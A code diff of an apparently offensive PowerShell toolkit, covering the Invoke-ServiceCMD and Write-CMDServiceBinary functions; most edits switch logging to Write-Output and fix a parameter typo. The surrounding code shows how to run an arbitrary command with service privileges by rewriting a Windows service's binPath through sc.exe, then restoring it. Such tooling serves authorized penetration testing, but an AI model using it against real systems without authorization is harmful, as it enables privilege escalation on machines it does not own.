@@ -429,7 +429,7 @@ function Invoke-ServiceCMD {
             # try to enable the service it was it was disabled
             $RestoreDisabled = $False
             if ($TargetService.StartMode -eq "Disabled"){
-                Write-Verbose "Service '$ServiceName' disabled, enabling..."
+                Write-Output "`nService '$ServiceName' disabled, enabling..."
 
                 $Result = sc.exe config $($TargetService.Name) start= demand
                 if ($Result -contains "Access is denied."){
@@ -442,32 +442,32 @@ function Invoke-ServiceCMD {
             # extract the original path and state so we can restore it later
             $OriginalPath = $TargetService.PathName
             $OriginalState = $TargetService.State
-            Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
-            Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"
+            Write-Output "`nService '$ServiceName' original path: '$OriginalPath'"
+            Write-Output "`nService '$ServiceName' original state: '$OriginalState'"
 
             # stop the service
             $Result = sc.exe stop $($TargetService.Name)
             Start-Sleep -s 1
 
             if ($Result -like "*Access is denied*"){
-                Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                Write-Output "`n[!] Access to service $($TargetService.Name) denied"
                 return $False
             }
             elseif ($Result -like "*1051*") {
                 # if we can't stop the service because other things depend on it
-                Write-Warning "[!] Stopping service $($TargetService.Name) failed: $Result"
+                Write-Output "`n[!] Stopping service $($TargetService.Name) failed: $Result"
                 return $False
             }
 
             # change the path name to the specified command
-            Write-Verbose "Setting service to execute command '$CMD'"
+            Write-Output "`nSetting service to execute command '$CMD'"
             $Result = sc.exe config $($TargetService.Name) binPath= $CMD
 
             # start the service and breath
             $Result = sc.exe start $($TargetService.Name)
             Start-Sleep -s 1
 
-            Write-Verbose "Restoring original path to service '$ServiceName'"
+            Write-Output "`nRestoring original path to service '$ServiceName'"
             # stop the service
             $Result = sc.exe stop $($TargetService.Name)
             Start-Sleep -s 1
@@ -477,33 +477,33 @@ function Invoke-ServiceCMD {
 
             # try to restore the service to whatever state it was
             if ($RestoreDisabled){
-                Write-Verbose "Re-disabling service '$ServiceName'"
+                Write-Output "`nRe-disabling service '$ServiceName'"
                 $Result = sc.exe config $($TargetService.Name) start= disabled
             }
             elseif ($OriginalState -eq "Paused"){
-                Write-Verbose "Starting and then pausing service '$ServiceName'"
+                Write-Output "`nStarting and then pausing service '$ServiceName'"
                 $Result = sc.exe start $($TargetService.Name)
                 Start-Sleep -s .5
                 $Result = sc.exe pause $($TargetService.Name)
             }
             elseif ($OriginalState -eq "Stopped"){
-                Write-Verbose "Leaving service '$ServiceName' in stopped state"
+                Write-Output "`nLeaving service '$ServiceName' in stopped state"
             }
             else{
-                Write-Verbose "Starting service '$ServiceName'"
+                Write-Output "`nStarting service '$ServiceName'"
                 $Result = sc.exe start $($TargetService.Name)
             }
 
-            "Command '$CMD' executed."
+            Write-Output "`nCommand '$CMD' executed."
         }
         catch{
-            Write-Warning "Error while modifying service '$ServiceName': $_"
+            Write-Output "`nError while modifying service '$ServiceName': $_"
             $False
         }
     }
 
     else{
-        Write-Warning "Target service '$ServiceName' not found on the machine"
+        Write-Output "`nTarget service '$ServiceName' not found on the machine"
         $False
     }
 }
@@ -666,7 +666,7 @@ function Write-CMDServiceBinary {
 
     try {
         # write the binary array out to the specified path
-        Set-Content -Balue $Binary -Encoding Byte -Path $Path
+        Set-Content -Value $Binary -Encoding Byte -Path $Path
         "[*] Binary for service '$ServiceName' with custom command '$CMD' written to '$Path'"
     }
     catch {
